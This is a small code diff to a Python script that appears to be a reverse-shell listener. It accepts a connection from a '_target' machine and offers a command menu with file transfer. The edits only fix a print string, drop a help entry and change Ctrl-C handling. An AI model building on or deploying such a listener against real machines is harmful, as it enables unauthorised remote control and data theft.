@@ -16,7 +16,7 @@ try:
     koneksi = soc.accept()
     _target = koneksi[0]
     ip = koneksi[1]
-    print('Connected to {str(ip)}')
+    print(f'Connected to {str(ip)}')
 except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
@@ -281,8 +281,6 @@ def shellc():
                    -exit/quit >> exit
                    
                    -clear     >> clear terminal
-
-                   -banner    >> banner
                    ================================
 
                       file transfer command:
@@ -368,6 +366,6 @@ def shellc():
             print("Connection aborted")
             break        
         except KeyboardInterrupt:
-            print("exiting...")
-            break  
+            print("\n")
+            pass
 shellc()
